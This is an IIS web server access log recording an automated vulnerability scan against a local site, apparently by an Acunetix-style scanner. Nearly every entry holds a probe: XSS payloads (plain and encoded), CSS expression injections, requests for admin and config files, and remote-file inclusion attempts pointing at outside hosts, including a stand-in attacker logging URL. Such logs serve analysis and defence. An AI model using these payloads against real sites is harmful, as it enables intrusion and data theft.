127.0.0.1, -, 3/23/2019, 1:48:12, W3SVC2, FIREPLACE, 127.0.0.1, 33, 178, 5299, 404, 2, GET, /downloads/site.tar, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 241, 5261, 404, 2, GET, /test.chm, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 303, 5325, 404, 2, GET, /images/[url=http:/www.vulnweb.com][/url], -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 263, 5261, 404, 2, GET, /webadmin, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 316, 5571, 403, 0, GET, /css/, <img/src="//testasp.vulnweb.com/t/dot.gif"onload=WMC1(9299)>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 306, 5331, 404, 2, GET, /downloads/[url=http:/www.vulnweb.com][/url], -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 289, 5547, 403, 0, GET, /css/, <img/src=">"+onerror=alert(9061)>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 232, 5261, 404, 2, GET, /5DiJt9RL, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 246, 5271, 404, 2, GET, /webstats.html, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 232, 5261, 404, 2, GET, /ckeditor, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 332, 5571, 403, 0, GET, /css/, %3C%53%63%52%69%50%74%20%3E%57%4D%43%31%289712%29%3C%2F%73%43%72%69%70%54%3E,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 305, 5369, 404, 2, GET, /downloads/}body{acu:Expre/**/SSion(Uh4U(9811))}, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 298, 5537, 403, 0, GET, /css/, \u003CScRiPt\WMC1(9054)\u003C/sCripT\u003E,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 302, 5363, 404, 2, GET, /images/}body{acu:Expre/**/SSion(5yqc(9260))}, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 261, 5257, 404, 2, GET, /admins, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 4, 238, 5273, 404, 2, GET, /admin/ckeditor, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 3, 295, 5550, 403, 0, GET, /css/, &lt;ScRiPt&gt;WMC1(9670)&lt;/sCripT&gt;,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 2, 268, 5271, 404, 2, GET, /administrivia, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 245, 5269, 404, 2, GET, /wwwstats.htm, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 264, 5263, 404, 2, GET, /useradmin, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 1, 374, 5489, 404, 2, GET, /wp-content/plugins/wp-syntaxhighlighter/syntaxhighlighter2/scripts/clipboard.swf, highlighterId=%22%29%29}catch%28e%29{}prompt%28document.domain%29;//,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 237, 5269, 404, 2, GET, /gvmtIXDH.php, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 231, 5257, 404, 2, GET, /db.php, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 265, 5325, 404, 2, GET, /typo3/contrib/extjs/resources/charts.swf, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 316, 5385, 404, 2, GET, /contrib/extjs/examples/feed-viewer/feed-proxy.php, feed=http://testasp.vulnweb.com/t/fit.txt,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 308, 5369, 404, 2, GET, /extjs/examples/feed-viewer/feed-proxy.php, feed=http://testasp.vulnweb.com/t/fit.txt,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 1, 264, 5263, 404, 2, GET, /sysadmins, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 291, 5542, 403, 0, GET, /css/, <a+HrEF=http://www.vulnweb.com></a>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 276, 5521, 403, 0, GET, /css/, <a+HrEF=jaVaScRiPT:>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 271, 5516, 403, 0, GET, /downloads/, 994270%40,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 390, 5493, 404, 0, GET, /downloads/exe/%3C%53%63%52%69%50%74%20%3E%75%54%63%32%289826%29%3C%2F%73%43%72%69%70%54%3E, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 290, 5529, 403, 0, GET, /css/, [url=http://www.vulnweb.com][/url],
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 290, 5547, 403, 0, GET, /downloads/, 1<ScRiPt>Uh4U(9239)</ScRiPt>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 259, 5313, 404, 2, GET, /contrib/extjs/resources/charts.swf, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 313, 5383, 404, 2, GET, /downloads/exe/&lt;ScRiPt&gt;uTc2(9918)&lt;/sCripT&gt;, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 233, 5261, 404, 2, GET, /conf.php, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 268, 5510, 403, 0, GET, /images/, 935242%40,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 315, 5341, 404, 2, GET, /downloads/exe/?img acu onmouseover=uTc2(9266) /?, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 251, 5281, 404, 2, GET, /auth_user_file.txt, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 251, 5297, 404, 2, GET, /extjs/resources/charts.swf, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 1, 289, 5546, 403, 0, GET, /downloads/, <W16J54>EFME5[!+!]</W16J54>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 287, 5541, 403, 0, GET, /images/, 1<ScRiPt>5yqc(9870)</ScRiPt>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 237, 5269, 404, 2, GET, /settings.php, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 286, 5540, 403, 0, GET, /images/, <W8RYVU>UUI0K[!+!]</W8RYVU>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 311, 5375, 404, 2, GET, /js/extjs/examples/feed-viewer/feed-proxy.php, feed=http://testasp.vulnweb.com/t/fit.txt,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 235, 5265, 404, 2, GET, /config.php, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 286, 5540, 403, 0, GET, /images/, <script>5yqc(9118)</script>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 315, 5383, 404, 2, GET, /lib/js/extjs/examples/feed-viewer/feed-proxy.php, feed=http://testasp.vulnweb.com/t/fit.txt,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 239, 5273, 404, 2, GET, /config.inc.php, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 266, 5267, 404, 2, GET, /admin_login, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 388, 5630, 403, 0, GET, /images/, %3C%53%63%52%3C%53%63%52%69%50%74%3E%49%70%54%3E%35%79%71%63%28%39%34%38%38%29%3C%2F%73%43%72%3C%53%63%52%69%50%74%3E%49%70%54%3E,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 316, 5385, 404, 2, GET, /libs/js/extjs/examples/feed-viewer/feed-proxy.php, feed=http://testasp.vulnweb.com/t/fit.txt,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 319, 5391, 404, 2, GET, /include/js/extjs/examples/feed-viewer/feed-proxy.php, feed=http://testasp.vulnweb.com/t/fit.txt,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 240, 5275, 404, 2, GET, /localconfig.php, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 1, 293, 5547, 403, 0, GET, /css/, }body{acu:Expre/**/SSion(WMC1(9059))},
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 293, 5547, 403, 0, GET, /images/, <ScRiPt+%0D%0A>5yqc(9406)</ScRiPt>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 320, 5574, 403, 0, GET, /images/, <ScRiPt/acu+src=//testasp.vulnweb.com/t/xss.js?9838></ScRiPt>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 266, 5267, 404, 2, GET, /admin_logon, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 310, 5339, 404, 2, GET, /downloads/exe/[url=http:/www.vulnweb.com][/url], -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 312, 5377, 404, 2, GET, /lib/extjs/examples/feed-viewer/feed-proxy.php, feed=http://testasp.vulnweb.com/t/fit.txt,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 384, 5481, 404, 0, GET, /project/%3C%53%63%52%69%50%74%20%3E%73%43%7A%35%289210%29%3C%2F%73%43%72%69%70%54%3E, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 309, 5377, 404, 2, GET, /downloads/exe/}body{acu:Expre/**/SSion(uTc2(9585))}, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 268, 5271, 404, 2, GET, /INSTALL_admin, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 306, 5570, 403, 0, GET, /images/, <video><source+onerror="javascript:5yqc(9549)">,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 242, 5279, 404, 2, GET, /configuration.php, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 289, 5546, 403, 0, GET, /downloads/, <script>Uh4U(9495)</script>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 307, 5371, 404, 2, GET, /project/&lt;ScRiPt&gt;sCz5(9105)&lt;/sCripT&gt;, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 313, 5379, 404, 2, GET, /libs/extjs/examples/feed-viewer/feed-proxy.php, feed=http://testasp.vulnweb.com/t/fit.txt,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 293, 5544, 403, 0, GET, /css/, ;Es3cb%0A1<ScRiPt>WMC1(9404)</ScRiPt>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 241, 5277, 404, 2, GET, /settings.inc.php, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 391, 5636, 403, 0, GET, /downloads/, %3C%53%63%52%3C%53%63%52%69%50%74%3E%49%70%54%3E%55%68%34%55%28%39%30%32%36%29%3C%2F%73%43%72%3C%53%63%52%69%50%74%3E%49%70%54%3E,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 283, 5534, 403, 0, GET, /css/, <W0MMTY>5LE0M[!+!]</W0MMTY>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 296, 5553, 403, 0, GET, /downloads/, <ScRiPt+%0D%0A>Uh4U(9414)</ScRiPt>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 291, 5543, 403, 0, GET, /css/, 1<ScRiPt>prompt(992390)</ScRiPt>=��,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 283, 5531, 403, 0, GET, /images/, <body+onload=5yqc(9223)>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 286, 5537, 403, 0, GET, /css/, <ifRAme+sRc=9528.com></IfRamE>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 316, 5385, 404, 2, GET, /include/extjs/examples/feed-viewer/feed-proxy.php, feed=http://testasp.vulnweb.com/t/fit.txt,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 254, 5303, 404, 2, GET, /js/extjs/resources/charts.swf, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 309, 5329, 404, 2, GET, /project/?img acu onmouseover=sCz5(9292) /?, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 319, 5577, 403, 0, GET, /images/, <img/src="//testasp.vulnweb.com/t/dot.gif"onload=5yqc(9488)>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 239, 5273, 404, 2, GET, /global.inc.php, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 243, 5238, 404, 0, GET, /web.config, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 292, 5553, 403, 0, GET, /images/, <img/src=">"+onerror=alert(9231)>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 237, 5269, 404, 2, GET, /database.php, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 271, 5516, 403, 0, GET, /css/, <7nt6OP+x=9340>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 232, 5261, 404, 2, GET, /8z0iPKFx, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 258, 5311, 404, 2, GET, /lib/js/extjs/resources/charts.swf, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 1, 323, 5580, 403, 0, GET, /downloads/, <ScRiPt/acu+src=//testasp.vulnweb.com/t/xss.js?9303></ScRiPt>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 335, 5577, 403, 0, GET, /images/, %3C%53%63%52%69%50%74%20%3E%35%79%71%63%289384%29%3C%2F%73%43%72%69%70%54%3E,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 295, 5537, 403, 0, GET, /css/, <img+sRc='http://attacker-9136/log.php?,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 241, 5277, 404, 2, GET, /database.inc.php, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 301, 5543, 403, 0, GET, /images/, \u003CScRiPt\5yqc(9792)\u003C/sCripT\u003E,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 266, 5505, 403, 0, GET, /css/, =998549%40,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 233, 5263, 404, 2, GET, /FCKeditor, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 298, 5340, 404, 2, GET, /images/flowplayer.swf, config=https://s3-us-west-2.amazonaws.com/bxss/fp.js,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 298, 5556, 403, 0, GET, /images/, &lt;ScRiPt&gt;5yqc(9391)&lt;/sCripT&gt;,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 285, 5536, 403, 0, GET, /css/, =1<ScRiPt>WMC1(9961)</ScRiPt>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 297, 5338, 404, 2, GET, /media/flowplayer.swf, config=https://s3-us-west-2.amazonaws.com/bxss/fp.js,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 294, 5548, 403, 0, GET, /images/, <a+HrEF=http://www.vulnweb.com></a>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 284, 5535, 403, 0, GET, /css/, =<W90HIR>UFWXW[!+!]</W90HIR>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 303, 5350, 404, 2, GET, /videoPlayer/flowplayer.swf, config=https://s3-us-west-2.amazonaws.com/bxss/fp.js,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 233, 5263, 404, 2, GET, /fckeditor, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 259, 5313, 404, 2, GET, /libs/js/extjs/resources/charts.swf, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 284, 5535, 403, 0, GET, /css/, =<script>WMC1(9765)</script>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 309, 5576, 403, 0, GET, /downloads/, <video><source+onerror="javascript:Uh4U(9700)">,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 310, 5364, 404, 2, GET, /plugins/flowplayer/flowplayer.swf, config=https://s3-us-west-2.amazonaws.com/bxss/fp.js,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 279, 5527, 403, 0, GET, /images/, <a+HrEF=jaVaScRiPT:>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 1, 293, 5535, 403, 0, GET, /images/, [url=http://www.vulnweb.com][/url],
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 386, 5625, 403, 0, GET, /css/, =%3C%53%63%52%3C%53%63%52%69%50%74%3E%49%70%54%3E%57%4D%43%31%28%39%37%36%35%29%3C%2F%73%43%72%3C%53%63%52%69%50%74%3E%49%70%54%3E,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 262, 5259, 404, 2, GET, /fpadmin, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 252, 5301, 404, 2, GET, /CFIDE/scripts/ajax/FCKeditor, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 291, 5542, 403, 0, GET, /css/, =<ScRiPt+%0D%0A>WMC1(9883)</ScRiPt>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 332, 5408, 404, 2, GET, /DesktopModules/EasyDNNRotator/flowplayer/flowplayer.swf, config=https://s3-us-west-2.amazonaws.com/bxss/fp.js,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 318, 5569, 403, 0, GET, /css/, =<ScRiPt/acu+src=//testasp.vulnweb.com/t/xss.js?9430></ScRiPt>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 304, 5327, 404, 2, GET, /project/[url=http:/www.vulnweb.com][/url], -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 247, 5273, 404, 2, GET, /global.asa.bak, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 345, 5434, 404, 2, GET, /wp-content/plugins/fv-wordpress-flowplayer/flowplayer/flowplayer.swf, config=https://s3-us-west-2.amazonaws.com/bxss/fp.js,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 296, 5553, 403, 0, GET, /images/, }body{acu:Expre/**/SSion(5yqc(9759))},
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 303, 5365, 404, 2, GET, /project/}body{acu:Expre/**/SSion(sCz5(9935))}, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 247, 5273, 404, 2, GET, /global.asa.old, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 262, 5319, 404, 2, GET, /include/js/extjs/resources/charts.swf, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 304, 5565, 403, 0, GET, /css/, =<video><source+onerror="javascript:WMC1(9528)">,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 247, 5273, 404, 2, GET, /global.asa.tmp, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 296, 5550, 403, 0, GET, /images/, ;ULKo8%0A1<ScRiPt>5yqc(9343)</ScRiPt>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 286, 5537, 403, 0, GET, /downloads/, <body+onload=Uh4U(9678)>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 310, 5364, 404, 2, GET, /classes/flowplayer/flowplayer.swf, config=https://s3-us-west-2.amazonaws.com/bxss/fp.js,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 322, 5583, 403, 0, GET, /downloads/, <img/src="//testasp.vulnweb.com/t/dot.gif"onload=Uh4U(9790)>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 281, 5526, 403, 0, GET, /css/, =<body+onload=WMC1(9265)>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 286, 5540, 403, 0, GET, /images/, <WBVRCH>JGOXL[!+!]</WBVRCH>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 248, 5275, 404, 2, GET, /global.asa.temp, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 294, 5549, 403, 0, GET, /images/, 1<ScRiPt>prompt(944250)</ScRiPt>=��,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 255, 5305, 404, 2, GET, /lib/extjs/resources/charts.swf, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 252, 5301, 404, 2, GET, /gs/plugins/editors/fckeditor, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 317, 5572, 403, 0, GET, /css/, =<img/src="//testasp.vulnweb.com/t/dot.gif"onload=WMC1(9372)>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 256, 5307, 404, 2, GET, /libs/extjs/resources/charts.swf, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 295, 5559, 403, 0, GET, /downloads/, <img/src=">"+onerror=alert(9113)>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 338, 5583, 403, 0, GET, /downloads/, %3C%53%63%52%69%50%74%20%3E%55%68%34%55%289450%29%3C%2F%73%43%72%69%70%54%3E,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 264, 5263, 404, 2, GET, /siteadmin, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 259, 5313, 404, 2, GET, /include/extjs/resources/charts.swf, -,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 304, 5549, 403, 0, GET, /downloads/, \u003CScRiPt\Uh4U(9377)\u003C/sCripT\u003E,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 290, 5548, 403, 0, GET, /css/, =<img/src=">"+onerror=alert(9274)>,
127.0.0.1, -, 3/24/2019, 19:05:21, W3SVC2, FIREPLACE, 127.0.0.1, 0, 301, 5562, 403, 0, GET, /downloads/, &lt;ScRiPt&gt;Uh4U(9497)&lt;/sCripT&gt;,
